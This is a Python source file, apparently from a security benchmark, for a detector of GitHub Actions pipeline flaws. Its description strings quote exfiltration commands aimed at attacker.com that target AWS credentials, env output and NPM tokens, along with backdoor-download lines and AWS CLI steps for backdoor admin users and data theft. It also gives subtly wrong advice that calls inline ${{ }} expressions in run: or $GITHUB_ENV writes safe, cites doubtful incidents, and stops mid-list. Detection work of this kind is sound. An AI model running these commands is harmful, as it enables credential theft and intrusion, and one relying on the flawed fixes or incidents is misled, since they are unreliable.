"""
Test suite for detecting CI/CD Pipeline Security vulnerabilities.
Supports: GitHub Actions (YAML)
"""
import re
from typing import Dict
import sys
from pathlib import Path

# Add parent directory to path for utils import
sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.code_locator import find_pattern_locations


class CICDSecurityDetector:
    """Detects security vulnerabilities in CI/CD pipeline configurations."""

    def __init__(self, use_severity_penalties: bool = False):
        """
        Initialize CI/CD Security detector.

        Args:
            use_severity_penalties: If True, applies severity-weighted penalties to scoring.
                                   This provides more accurate scoring for mixed security patterns
                                   but changes historical benchmark results. Default False for
                                   backward compatibility with existing benchmarks.
        """
        self.vulnerabilities = []
        self.score = 0
        self.use_severity_penalties = use_severity_penalties

    def analyze(self, code: str, language: str = "yaml") -> Dict:
        """Analyze CI/CD configuration for security vulnerabilities."""
        if language == "yaml":
            # Distinguish between GitHub Actions and GitLab CI
            if re.search(r'(?:jobs|stages):', code) and re.search(r'(?:script|image):', code):
                # GitLab CI (.gitlab-ci.yml)
                return self._analyze_gitlab_ci(code)
            else:
                # GitHub Actions
                return self._analyze_github_actions(code)
        elif language == "groovy":
            return self._analyze_jenkins(code)
        else:
            return {"score": 0, "vulnerabilities": ["Unsupported CI/CD format"], "max_score": 2}

    def _analyze_github_actions(self, code: str) -> Dict:
        """Analyze GitHub Actions workflow for security issues."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: Hardcoded credentials (AWS, API keys, tokens)
        secret_pattern = r'(?:AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|API_KEY|SECRET_KEY|TOKEN|PASSWORD)\s*[:=]\s*["\']?(?:AKIA|sk-|AIza|ghp_|[A-Za-z0-9+/]{20,})'
        if re.search(secret_pattern, code, re.IGNORECASE):
            locations = find_pattern_locations(code, secret_pattern, re.IGNORECASE)
            if locations:
                self.vulnerabilities.append({
                    "type": "HARDCODED_CREDENTIALS",
                    "severity": "CRITICAL",
                    "description": "Hardcoded Credentials in GitHub Actions - ATTACK: Workflow files (.github/workflows/*.yml) containing hardcoded credentials (AWS keys, API tokens, passwords, secrets) are stored in Git history and visible to anyone with repository read access. GitHub Actions logs are visible to all repository contributors, and workflow files can be accessed via GitHub API. EXPLOITATION: (1) Attacker forks repository or gets read access. (2) Searches workflow files for patterns like 'AKIA' (AWS keys), 'ghp_' (GitHub tokens), 'sk-' (API keys). (3) Clones repository and runs 'git log -p -- .github/workflows/' to search entire commit history for deleted credentials. (4) Uses GitHub API: GET /repos/:owner/:repo/contents/.github/workflows to access workflow files programmatically. (5) Monitors public repos with GitHub search: 'AKIAIOSFODNN7 OR sk-proj- OR ghp_ path:.github/workflows' finds thousands of leaked credentials. (6) Accesses stolen AWS keys to list S3 buckets, EC2 instances, Lambda functions. (7) Uses compromised credentials to deploy malware, exfiltrate data, or create resources for cryptomining. IMPACT: Credential Theft (AWS keys, API tokens, database passwords exposed in Git), Account Takeover (full AWS/cloud account access), Data Breach (S3 buckets with customer data accessible), Resource Hijacking ($45k+ AWS bills from cryptominers), Production Compromise (deploy backdoors to production systems), Supply Chain Attack (publish malicious packages to npm/PyPI using leaked tokens). REAL-WORLD: Uber 2016 (AWS keys hardcoded in GitHub, 57M records stolen), Toyota 2023 (AWS keys in public GitHub for 5 years, 2.15M customers exposed), Codecov 2021 (leaked Docker credentials via Actions), Twitch 2021 (125GB source code leaked included hardcoded credentials in workflows), GitHub Actions credential leaks 2022-2024 (thousands of AWS keys, Slack tokens, database passwords found in public workflow files).",
                    "recommendation": "CRITICAL FIX: (1) Immediately rotate ALL credentials found in workflow files (assume compromised). (2) Use GitHub Secrets: Settings → Secrets → Actions → New repository secret. Reference in workflow: 'env: AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}'. (3) Use OIDC for cloud providers (no long-lived credentials): AWS: 'permissions: id-token: write' + 'aws-actions/configure-aws-credentials@v4 with role-to-assume'. (4) Scan Git history for leaked credentials: 'git log -p -- .github/workflows/ | grep -i \"AKIA\\|secret\\|password\"' then rotate any found. (5) Use GitHub Secret Scanning alerts (Settings → Security). ALTERNATIVES: (1) Use GitHub Apps with fine-grained permissions instead of personal access tokens. (2) Use AWS IAM Roles for GitHub Actions (OIDC federation) - no static credentials. (3) Vault/HashiCorp integration: dynamic credentials that expire after workflow run. (4) Separate deployment workflows with environment protection rules requiring approvals. MONITORING: (1) Enable GitHub Secret Scanning (detects 200+ credential types in commits). (2) AWS CloudTrail: monitor for API calls from unexpected IPs/regions (GitHub Actions uses specific IP ranges). (3) Audit repository access logs: Settings → Access (detect forks/clones from suspicious accounts). (4) Use Gitleaks/TruffleHog in pre-commit hooks to prevent credential commits. (5) Monitor GitHub Audit Log for: 'action:workflows.updated' events (detect credential additions). TOOLS: (1) Gitleaks: 'gitleaks detect --source .github/workflows/'. (2) TruffleHog: scans Git history for secrets. (3) GitHub Secret Scanning (free for public repos). (4) AWS Access Analyzer: detects exposed AWS credentials.",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content'],
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "Workflow YAML file contains AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, API_KEY, SECRET_KEY, TOKEN, or PASSWORD variables",
                            "Credential values match patterns: 'AKIA*' (AWS keys), 'sk-' (API keys), 'ghp_' (GitHub tokens), or base64 strings 20+ chars",
                            "Credentials are assigned literal string values instead of '${{ secrets.* }}' references",
                            "Credentials exist in 'env:' sections, 'run:' commands, or action parameters",
                            "Workflow file is committed to Git (all commits are permanent and searchable)"
                        ],
                        "why_vulnerable": [
                            "GitHub Actions workflow files stored in .github/workflows/ are part of Git repository and visible to anyone with read access",
                            "Git history is immutable - even deleted credentials remain in commit history forever",
                            "Workflow files accessible via GitHub API without authentication for public repos: GET /repos/:owner/:repo/contents/.github/workflows",
                            "Repository forks copy entire Git history including workflow files with credentials",
                            "GitHub Actions logs may display environment variables if workflow uses 'echo' or 'printenv' commands",
                            "Automated tools (Gitleaks, TruffleHog, GitHub Secret Scanning) continuously scan public repos for credential patterns",
                            "GitHub Search allows searching across millions of repos: 'AKIAIOSFODNN7 path:.github/workflows' finds exposed AWS keys",
                            "Credentials with broad permissions (AWS Administrator, GitHub write access) provide full account takeover",
                            "Many developers don't realize workflow files are public when repository visibility is public",
                            "Continuous integration means workflows run frequently, keeping credentials 'warm' and undetected as compromised",
                            "AWS keys starting with 'AKIA' are permanent access keys (unlike temporary STS tokens) - remain valid until manually rotated",
                            "Repository collaborators can view workflow run logs which may contain credential values",
                            "Pull requests from forks can access workflow files and potentially extract secrets through malicious PRs",
                            "GitHub Actions cache and artifacts may contain credentials if workflow doesn't properly sanitize",
                            "Organization-wide workflow templates can propagate hardcoded credentials to multiple repositories"
                        ],
                        "why_not_vulnerable": [
                            "Credentials are stored in GitHub Secrets and referenced as '${{ secrets.AWS_ACCESS_KEY_ID }}'",
                            "Using OpenID Connect (OIDC) for cloud authentication - no static credentials needed",
                            "Credentials are retrieved from external secret management (Vault, AWS Secrets Manager) at runtime",
                            "Using GitHub Apps with installation tokens (short-lived, scoped permissions)",
                            "Workflow uses IAM roles for service accounts (GCP Workload Identity, AWS IRSA)",
                            "Repository is private AND has restricted access AND credentials are temporary",
                            "Credentials are environment-specific placeholders that require manual configuration",
                            "Using credential-less authentication (SSH keys with deploy keys, GitHub's GITHUB_TOKEN)"
                        ],
                        "patterns_checked": [
                            r"AWS_ACCESS_KEY_ID.*AKIA[0-9A-Z]{16}",
                            r"AWS_SECRET_ACCESS_KEY.*[A-Za-z0-9/+=]{40}",
                            r"API_KEY.*(?:sk-|AIza)[A-Za-z0-9-_]{20,}",
                            r"TOKEN.*ghp_[A-Za-z0-9]{36}",
                            r"PASSWORD.*[\"'][^\"']{8,}",
                            r"SECRET.*[A-Za-z0-9+/]{20,}"
                        ],
                        "evidence": {
                            "credential_pattern": "Found AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, or API_KEY with literal values",
                            "not_using_secrets": "Credentials not referenced as ${{ secrets.* }}",
                            "git_trackable": "Workflow file committed to Git repository",
                            "repository_visibility": "Credentials accessible to all with repository read permission"
                        },
                        "attack_scenario": {
                            "step_1": f"Developer at line {locations[0]['line_number']} hardcodes AWS keys: 'AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE'",
                            "step_2": "Commits workflow file to GitHub: 'git add .github/workflows/deploy.yml && git commit -m \"Add deployment\"'",
                            "step_3": "Attacker discovers repository through GitHub search: 'AKIA path:.github/workflows language:YAML'",
                            "step_4": "Clones repository: 'git clone https://github.com/company/repo && cd repo'",
                            "step_5": "Searches workflow files: 'grep -r \"AKIA\" .github/workflows/' - finds AWS access key",
                            "step_6": "Searches Git history for more credentials: 'git log -p -- .github/workflows/ | grep -E \"AKIA|SECRET_ACCESS_KEY\"'",
                            "step_7": "Configures AWS CLI with stolen credentials: 'aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE'",
                            "step_8": "Lists accessible resources: 'aws s3 ls' - finds 50+ S3 buckets including customer-data-prod",
                            "step_9": "Downloads customer database backup: 'aws s3 cp s3://customer-data-prod/backup.sql.gz .'",
                            "step_10": "Checks permissions: 'aws iam get-user' - discovers AdministratorAccess policy attached",
                            "step_11": "Creates backdoor IAM user: 'aws iam create-user --user-name system-backup && aws iam attach-user-policy --user-name system-backup --policy-arn arn:aws:iam::aws:policy/AdministratorAccess'",
                            "step_12": "Deploys cryptominer to Lambda: 'aws lambda create-function --function-name UpdateProcessor --runtime python3.9 --handler lambda_function.lambda_handler --zip-file fileb://miner.zip' (runs 24/7 generating $45k+ AWS bill)",
                            "step_13": "Exfiltrates RDS snapshots: 'aws rds describe-db-snapshots && aws rds copy-db-snapshot --target-region attacker-controlled-region'",
                            "step_14": "Modifies EC2 security groups: 'aws ec2 authorize-security-group-ingress --group-id sg-12345 --protocol tcp --port 22 --cidr 0.0.0.0/0' (opens SSH to internet)",
                            "step_15": "Sells database on dark web: 2M customer records with emails, passwords, credit cards → $500k profit",
                            "alternative_attack_1": "Use compromised GitHub token (ghp_*) to push malicious code to repositories",
                            "alternative_attack_2": "Use stolen npm token to publish malicious versions of popular packages",
                            "alternative_attack_3": "Use database credentials to directly connect and exfiltrate data",
                            "impact": "Credential Theft (permanent AWS keys, API tokens), Account Takeover (full AWS Administrator access), Data Breach (customer databases, S3 backups), Financial Loss ($45k+ AWS bills, $500k from data sale), Production Compromise (backdoor IAM users, modified security groups), Supply Chain Attack (malicious npm packages using stolen tokens), Regulatory Penalties (GDPR fines for exposed customer data)"
                        }
                    }
                })
                self.score = 0

        # Pattern 2: Unrestricted third-party actions (no version pinning)
        unpinned_action = r'uses:\s+[^@\s]+/[^@\s]+(?:@(?:main|master|latest|v\d+))?(?!\s*@[a-f0-9]{40})'
        if re.search(unpinned_action, code):
            # Check if using short refs instead of commit SHAs
            if not re.search(r'uses:\s+[^@]+@[a-f0-9]{40}', code):
                locations = find_pattern_locations(code, r'uses:\s+')
                if locations:
                    self.vulnerabilities.append({
                        "type": "UNRESTRICTED_THIRD_PARTY_ACTIONS",
                        "severity": "CRITICAL",
                        "description": "Third-party actions not pinned to commit SHA - supply chain attack vector. Using @main, @master, @latest, or version tags (v1, v2) instead of commit SHAs allows malicious code injection if action repository is compromised. Attackers who gain write access to action repositories (codecov/codecov-action, actions/checkout, docker/build-push-action, etc.) can push malicious code to floating refs that automatically affects all workflows using unpinned versions. REAL-WORLD: CodeCov 2021 (Docker credentials stolen via compromised action), GitHub Actions token leaks 2022-2024 (thousands of credentials exposed through malicious action updates).",
                        "recommendation": "Pin actions to commit SHA: uses: actions/checkout@a81bbbf8298c0fa03ea29cdc473d45769f953675. Verify SHAs match official releases. Use Dependabot to track updates.",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = 0  # Auto-fail for supply chain risk

        # Pattern 3: Overly permissive permissions
        if re.search(r'permissions:\s*write-all|permissions:\s*\n\s*contents:\s*write\s*\n\s*packages:\s*write', code):
            locations = find_pattern_locations(code, r'permissions:\s*(?:write-all|.*contents:\s*write)')
            if locations:
                self.vulnerabilities.append({
                    "type": "OVERLY_PERMISSIVE_PERMISSIONS",
                    "severity": "HIGH",
                    "description": "Workflow has excessive permissions - privilege escalation risk",
                    "recommendation": "Use least privilege: specify only required permissions (e.g., contents: read)",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Pattern 4: Script injection from untrusted input
        injection_pattern = r'\$\{\{\s*(?:github\.event\.pull_request\.title|github\.event\.pull_request\.body|github\.event\.issue\.title|github\.head_ref)\s*\}\}'
        if re.search(injection_pattern, code):
            locations = find_pattern_locations(code, injection_pattern)
            if locations:
                self.vulnerabilities.append({
                    "type": "SCRIPT_INJECTION",
                    "severity": "CRITICAL",
                    "description": "Script Injection in GitHub Actions - ATTACK: Using untrusted user input directly in workflow run commands allows attackers to inject arbitrary shell commands. GitHub Actions expressions like '${{ github.event.pull_request.title }}' are evaluated BEFORE shell execution, so attackers can insert backticks, $(), semicolons, pipes, and other shell metacharacters that break out of the intended command context. Pull request titles, branch names, issue titles, and commit messages are all attacker-controlled. EXPLOITATION: (1) Attacker creates pull request with malicious title: 'Feature Update`curl attacker.com/$(cat ~/.aws/credentials | base64)`'. (2) Workflow runs: 'echo PR: ${{ github.event.pull_request.title }}' which evaluates to 'echo PR: Feature Update`curl attacker.com/$(cat ~/.aws/credentials | base64)`'. (3) Shell executes embedded commands in backticks: exfiltrates AWS credentials. (4) Attacker uses semicolons for command chaining: 'Fix bug; wget attacker.com/backdoor.sh; bash backdoor.sh'. (5) Workflow logs may show 'Error: backdoor.sh: command not found' but backdoor already executed. (6) Attacker uses environment variable expansion: 'Update $GITHUB_TOKEN' - workflow logs show actual token value. (7) Pipeline operators exploit: 'Test | base64 | curl -d @- attacker.com' exfiltrates pipeline secrets. IMPACT: Remote Code Execution (arbitrary commands on GitHub Actions runner), Credential Theft (GITHUB_TOKEN, AWS keys, npm tokens stolen via curl/wget), Repository Compromise (attacker pushes malicious commits using stolen GITHUB_TOKEN), Data Exfiltration (source code, environment variables, secrets sent to attacker server), Supply Chain Attack (publish malicious packages during compromised build), Resource Hijacking (deploy cryptominers to runner). REAL-WORLD: GitHub Actions script injection CVE-2020-15228 (widespread exploitation pattern documented by GitHub Security Lab), HashiCorp Terraform provider injections 2021 (pull request title injection in CI), Multiple npm package compromises 2022-2023 via GitHub Actions injection (attackers published malicious versions), Dependabot PRs exploited 2021 (malicious dependency names triggered injections), GitHub Advisory Database compromises 2022 (injection via crafted issue titles).",
                    "recommendation": "CRITICAL FIX: (1) NEVER use untrusted input directly in 'run:' commands. (2) Use intermediate environment variables (evaluated separately from shell): 'run: | PR_TITLE=\"${{ github.event.pull_request.title }}\" echo \"PR: $PR_TITLE\"' (variable expansion happens after expression evaluation). (3) Better: Use $GITHUB_ENV file: 'run: echo \"PR_TITLE=${{ github.event.pull_request.title }}\" >> $GITHUB_ENV' then reference in subsequent steps. (4) Use GitHub Actions expressions in 'if:' conditions (safer): 'if: github.event.pull_request.title == \"Fix bug\"'. (5) Sanitize input with validation: 'run: | TITLE=\"${{ github.event.pull_request.title }}\" if [[ $TITLE =~ ^[a-zA-Z0-9 ]+$ ]]; then echo \"Valid: $TITLE\"; fi'. (6) Avoid these dangerous patterns: github.event.pull_request.title, github.event.pull_request.body, github.event.issue.title, github.head_ref, github.event.commits[].message. ALTERNATIVES: (1) Use actions/github-script for JavaScript-based workflows (no shell injection). (2) Pass inputs as action inputs instead of inline expressions. (3) Use jq/yq to safely parse JSON: 'run: echo '${{ toJSON(github.event) }}' | jq -r '.pull_request.title''. (4) Restrict workflow triggers: use 'pull_request' instead of 'pull_request_target' (less privileged). MONITORING: (1) Audit workflow runs for suspicious commands: GitHub Actions logs show full command output. (2) Monitor for unexpected network connections from runners: GitHub Actions uses specific IP ranges. (3) Enable GitHub Advanced Security: code scanning detects injection patterns. (4) Review workflow modifications: track changes to .github/workflows/* files. (5) Monitor GITHUB_TOKEN usage: unusual API calls indicate compromise. TOOLS: (1) actionlint: lints GitHub Actions workflows for injection patterns. (2) GitHub CodeQL: 'ql/javascript-all/Security/CWE-094/CodeInjection.ql' detects injections. (3) Semgrep: rules for detecting unsafe GitHub Actions patterns.",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content'],
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "Workflow 'run:' command contains GitHub Actions expressions: ${{ ... }}",
                            "Expression references untrusted input sources: github.event.pull_request.title, github.event.pull_request.body, github.event.issue.title, github.head_ref",
                            "Expression is evaluated inline within shell command (not assigned to environment variable first)",
                            "No input validation or sanitization before use",
                            "Command context allows shell metacharacters: backticks, $(), ;, |, &, >, >>, <"
                        ],
                        "why_vulnerable": [
                            "GitHub Actions expressions ${{ }} are evaluated BEFORE shell execution - attacker input becomes part of shell command",
                            "Pull request titles, branch names, issue titles are fully attacker-controlled (anyone can create PR with malicious title)",
                            "Shell metacharacters in untrusted input allow command injection: backticks `cmd`, $(cmd), semicolons ;, pipes |",
                            "GitHub Actions runners execute with privileged access: write permissions to repository, access to secrets",
                            "GITHUB_TOKEN in workflow has write permissions by default (can push commits, create releases)",
                            "Workflow runs in context of target repository (pull_request_target) or fork (pull_request) - both exploitable",
                            "GitHub Actions logs are visible to attackers showing whether exploitation succeeded",
                            "Expression evaluation happens recursively - nested expressions allow complex attacks",
                            "Many developers unaware of expression evaluation order - assume shell processes input first",
                            "Common vulnerable pattern: 'run: echo \"${{ github.event.pull_request.title }}\"' - quotes don't prevent injection",
                            "Multiline run commands increase attack surface - multiple injection points",
                            "Environment variable expansion ($VAR) happens after expression evaluation - double evaluation vulnerability",
                            "GitHub Actions doesn't sanitize/escape untrusted input - developers responsible for safety",
                            "Workflows triggered by external events (issues, PRs) are high-risk - public attack surface",
                            "Script blocks (run: |) allow multi-command injection - attacker controls entire script section"
                        ],
                        "why_not_vulnerable": [
                            "Untrusted input assigned to environment variable first: 'env: PR_TITLE: ${{ ... }}' then used as '$PR_TITLE'",
                            "Input written to $GITHUB_ENV file: 'echo \"VAR=${{ }}\" >> $GITHUB_ENV' (safe evaluation)",
                            "Using actions/github-script instead of shell commands (JavaScript context prevents shell injection)",
                            "Input validated with regex before use: 'if: github.event.pull_request.title matches pattern'",
                            "Workflow uses 'pull_request' trigger (not pull_request_target) with read-only permissions",
                            "Expression used only in 'if:' conditions or 'with:' parameters (not in shell commands)",
                            "Input passed through jq/yq for safe parsing: 'echo '${{ toJSON() }}' | jq -r'",
                            "Workflow doesn't use untrusted input sources (only github.actor, github.sha, github.ref)"
                        ],
                        "patterns_checked": [
                            r"\$\{\{\s*github\.event\.pull_request\.title\s*\}\}",
                            r"\$\{\{\s*github\.event\.pull_request\.body\s*\}\}",
                            r"\$\{\{\s*github\.event\.issue\.title\s*\}\}",
                            r"\$\{\{\s*github\.head_ref\s*\}\}",
                            r"\$\{\{\s*github\.event\.commits\[.*\]\.message\s*\}\}",
                            r"run:.*\$\{\{"
                        ],
                        "evidence": {
                            "untrusted_input": "GitHub Actions expression references attacker-controlled input (PR title, issue title, branch name)",
                            "inline_evaluation": "Expression evaluated inline in 'run:' command (not assigned to env var first)",
                            "shell_context": "Command executed in shell allowing metacharacter injection",
                            "no_sanitization": "No input validation or sanitization detected"
                        },
                        "attack_scenario": {
                            "step_1": f"Workflow at line {locations[0]['line_number']} uses untrusted input in run command: 'echo PR: ${{{{ github.event.pull_request.title }}}}'",
                            "step_2": "Attacker creates malicious pull request with title: 'Security Fix`curl http://attacker.com/exfil?data=$(env|base64)`'",
                            "step_3": "GitHub Actions workflow triggered on pull request creation",
                            "step_4": "Expression evaluates to: 'echo PR: Security Fix`curl http://attacker.com/exfil?data=$(env|base64)`'",
                            "step_5": "Shell executes backtick command injection: 'curl http://attacker.com/exfil?data=$(env|base64)'",
                            "step_6": "env command dumps all environment variables including GITHUB_TOKEN, AWS credentials, npm tokens",
                            "step_7": "base64 encodes output to bypass logging/filtering, curl sends to attacker server",
                            "step_8": "Attacker receives base64-encoded environment: decodes to extract GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxx",
                            "step_9": "Attacker tests token permissions: 'curl -H \"Authorization: token ghp_xxx\" https://api.github.com/user' - confirms write access",
                            "step_10": "Clones repository with stolen token: 'git clone https://ghp_xxx@github.com/company/repo.git'",
                            "step_11": "Injects backdoor into main application: modifies authentication logic to accept attacker credentials",
                            "step_12": "Pushes malicious commit: 'git commit -am \"Fix authentication\" && git push origin main' (using stolen GITHUB_TOKEN)",
                            "step_13": "Backdoor deploys to production through normal CI/CD pipeline (code review bypassed via compromised account)",
                            "step_14": "Attacker uses backdoor to access production admin panel: steals customer database with 5M records",
                            "step_15": "Sells database on dark web: 5M customers with emails, hashed passwords, payment methods → $2M profit",
                            "alternative_attack_1": "Inject command to publish malicious npm package: 'npm publish --access public' using stolen npm token from environment",
                            "alternative_attack_2": "Use semicolon injection: 'Test; wget attacker.com/miner.sh; bash miner.sh' - deploys cryptominer to runner",
                            "alternative_attack_3": "Exfiltrate secrets from $GITHUB_ENV file: 'Fix`cat $GITHUB_ENV | curl -d @- attacker.com`'",
                            "impact": "Remote Code Execution (arbitrary commands on GitHub Actions runner), Credential Theft (GITHUB_TOKEN, AWS keys, npm tokens), Repository Compromise (malicious commits pushed to main), Data Exfiltration (environment variables, secrets, source code), Supply Chain Attack (publish malicious npm/PyPI packages), Production Compromise (backdoored code deployed), Financial Loss ($2M from data breach)"
                        }
                    }
                })
                self.score = 0

        # Pattern 5: Missing code scanning
        has_codeql = re.search(r'uses:\s+github/codeql-action|uses:\s+.*security.*scan', code)
        has_run_tests = re.search(r'run:.*(?:test|pytest|npm test|go test)', code)

        if has_run_tests and not has_codeql:
            # Workflow builds/tests but lacks security scanning
            locations = find_pattern_locations(code, r'run:.*(?:test|build)')
            if locations:
                self.vulnerabilities.append({
                    "type": "MISSING_CODE_SCANNING",
                    "severity": "MEDIUM",
                    "description": "CI/CD pipeline lacks security scanning (SAST/CodeQL)",
                    "recommendation": "Add CodeQL: uses: github/codeql-action/analyze@v2",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = max(0, self.score - 1)

        # Pattern 6: Sensitive data in artifacts
        if re.search(r'actions/upload-artifact', code):
            # Check if uploading config files, credentials, etc.
            if re.search(r'path:.*(?:\.env|config|secrets?|credentials?)', code, re.IGNORECASE):
                locations = find_pattern_locations(code, r'actions/upload-artifact')
                if locations:
                    self.vulnerabilities.append({
                        "type": "SENSITIVE_DATA_IN_ARTIFACTS",
                        "severity": "HIGH",
                        "description": "Uploading sensitive files as artifacts - data exposure risk",
                        "recommendation": "Exclude sensitive files from artifacts; use .gitignore patterns",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = 0

        # Pattern 7: Direct push to main/master
        if re.search(r'push:\s*\n\s*branches:\s*\[?\s*["\']?(?:main|master)', code):
            locations = find_pattern_locations(code, r'push:\s*\n\s*branches:.*(?:main|master)')
            if locations:
                self.vulnerabilities.append({
                    "type": "DIRECT_PUSH_TO_MAIN",
                    "severity": "MEDIUM",
                    "description": "Workflow triggers on direct push to main - missing branch protection",
                    "recommendation": "Use pull_request trigger and enable branch protection rules",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = max(0, self.score - 1)

        # Pattern 8: Caching sensitive data
        if re.search(r'actions/cache', code):
            if re.search(r'path:.*(?:\.env|config|node_modules.*\.env|\.aws)', code, re.IGNORECASE):
                locations = find_pattern_locations(code, r'actions/cache')
                if locations:
                    self.vulnerabilities.append({
                        "type": "CACHING_SENSITIVE_DATA",
                        "severity": "MEDIUM",
                        "description": "Caching sensitive files - credentials persisted in cache",
                        "recommendation": "Exclude sensitive paths from cache; cache only dependencies",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = max(0, self.score - 1)

        # Pattern 9: Environment variable exposure in logs
        if re.search(r'run:.*echo.*\$\{\{|run:.*printenv', code):
            locations = find_pattern_locations(code, r'run:.*(?:echo.*\$\{\{|printenv)')
            if locations:
                self.vulnerabilities.append({
                    "type": "ENVIRONMENT_VARIABLE_EXPOSURE",
                    "severity": "HIGH",
                    "description": "Logging environment variables - secrets may be exposed in logs",
                    "recommendation": "Avoid logging secrets; use ::add-mask:: to hide sensitive values",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Pattern 10: Self-hosted runners with untrusted code
        if re.search(r'runs-on:\s*(?:self-hosted|\[.*self-hosted)', code):
            if re.search(r'pull_request_target|workflow_dispatch', code):
                locations = find_pattern_locations(code, r'runs-on:.*self-hosted')
                if locations:
                    self.vulnerabilities.append({
                        "type": "SELF_HOSTED_RUNNER_RISK",
                        "severity": "CRITICAL",
                        "description": "Self-hosted runner executes untrusted code - infrastructure compromise risk",
                        "recommendation": "Use GitHub-hosted runners for untrusted code; isolate self-hosted runners",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = 0

        # Pattern 11: pull_request_target misuse
        if re.search(r'on:\s*pull_request_target', code):
            # Check if checking out PR code
            if re.search(r'ref:.*github\.event\.pull_request\.head\.sha|checkout.*pull_request\.head\.ref', code):
                locations = find_pattern_locations(code, r'on:.*pull_request_target')
                if locations:
                    self.vulnerabilities.append({
                        "type": "PULL_REQUEST_TARGET_MISUSE",
                        "severity": "CRITICAL",
                        "description": "pull_request_target Misuse - ATTACK: The 'pull_request_target' trigger runs workflows with WRITE permissions and access to repository secrets even for pull requests from UNTRUSTED FORKS. If the workflow checks out PR code using 'ref: github.event.pull_request.head.sha' or 'ref: github.head_ref', it executes attacker-controlled code with write access to the target repository. Unlike 'pull_request' which runs in fork context with read-only permissions, 'pull_request_target' runs in target repo context with GITHUB_TOKEN having full write permissions. EXPLOITATION: (1) Attacker forks public repository. (2) Modifies workflow to exfiltrate secrets or push malicious commits. (3) Creates pull request from fork. (4) Target repo's workflow runs with 'pull_request_target' trigger. (5) Workflow checks out attacker's PR code: 'uses: actions/checkout@v3 with: ref: github.event.pull_request.head.sha'. (6) Attacker's code executes with write permissions: can access secrets, modify repository. (7) Exfiltrates secrets via curl: 'run: curl attacker.com?token=${{ secrets.NPM_TOKEN }}'. (8) Pushes malicious code: uses GITHUB_TOKEN to commit backdoors. IMPACT: Credential Theft (all repository secrets accessible to attacker), Repository Takeover (GITHUB_TOKEN has write permissions - can push commits, modify releases), Supply Chain Attack (publish malicious npm/PyPI packages using stolen tokens), Code Injection (attacker can modify main branch, inject backdoors), Data Exfiltration (steal proprietary source code, customer data), CI/CD Compromise (modify workflows to persist access). REAL-WORLD: GitHub Actions pwn request vulnerability 2020 (pull_request_target widely exploited), Multiple open-source projects compromised 2021-2023 (attackers used pull_request_target to steal npm tokens), GitHub Security Lab advisory GHSL-2021-1032 (documented exploitation techniques), Dependabot security updates exploited via pull_request_target 2021, Major npm packages compromised through fork PRs 2022 (tokens stolen, malicious versions published).",
                        "recommendation": "CRITICAL FIX: (1) NEVER check out PR code when using 'pull_request_target' trigger. (2) Use 'pull_request' trigger instead (runs in fork context, read-only permissions, no secrets access). (3) If pull_request_target is required (for commenting on PRs), use two-workflow pattern: (a) First workflow: 'pull_request' trigger, runs tests, uploads results as artifact (no secrets). (b) Second workflow: 'workflow_run' trigger, downloads artifacts, has write permissions but doesn't execute PR code. (4) Remove dangerous checkout patterns: NEVER use 'ref: github.event.pull_request.head.sha' or 'ref: github.head_ref' with pull_request_target. (5) If you must run untrusted code, use isolated environment: run in Docker container with no network access, no secrets. (6) Use 'if:' conditions to restrict execution: 'if: github.event.pull_request.head.repo.full_name == github.repository' (only run for same-repo PRs, not forks). ALTERNATIVES: (1) Use 'pull_request' trigger with limited permissions (safest option). (2) Use third-party CI systems (CircleCI, Travis) with better fork isolation. (3) GitHub Apps with fine-grained permissions instead of GITHUB_TOKEN. (4) Manual workflow approval for fork PRs: 'environment: name: fork-approval' requires maintainer approval. MONITORING: (1) Audit all workflows using pull_request_target: search .github/workflows/ for 'pull_request_target'. (2) Enable GitHub Advanced Security: alerts for dangerous patterns. (3) Monitor workflow runs from forks: check 'github.event.pull_request.head.repo.fork == true'. (4) Review workflow run logs for suspicious activity: unexpected network calls, secret exfiltration attempts. (5) Track GITHUB_TOKEN usage: API calls to push commits, modify releases from untrusted PRs. TOOLS: (1) actionlint: detects pull_request_target misuse. (2) GitHub Security Lab: 'action-validator' checks for vulnerabilities. (3) Semgrep rules: 'github-actions.security.pull-request-target-code-checkout'.",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content'],
                        "detection_reasoning": {
                            "criteria_for_vulnerability": [
                                "Workflow trigger is 'pull_request_target' (runs with write permissions and secrets access)",
                                "Workflow checks out PR code: 'ref: github.event.pull_request.head.sha' or 'ref: github.head_ref'",
                                "No restriction to same-repo PRs: missing 'if: github.event.pull_request.head.repo.full_name == github.repository'",
                                "Workflow has access to secrets: no environment protection or approval requirements",
                                "PR code can execute arbitrary commands: 'run:' steps after checkout or build steps that execute PR code"
                            ],
                            "why_vulnerable": [
                                "pull_request_target runs in target repository context with full write permissions - NOT in fork context",
                                "GITHUB_TOKEN in pull_request_target workflows has 'contents: write' and 'packages: write' by default",
                                "All repository secrets are accessible to pull_request_target workflows - even from untrusted forks",
                                "Checking out PR code with 'ref: github.event.pull_request.head.sha' executes attacker-controlled code in privileged context",
                                "Attacker can create fork, modify any file including package.json scripts, Makefile, build scripts",
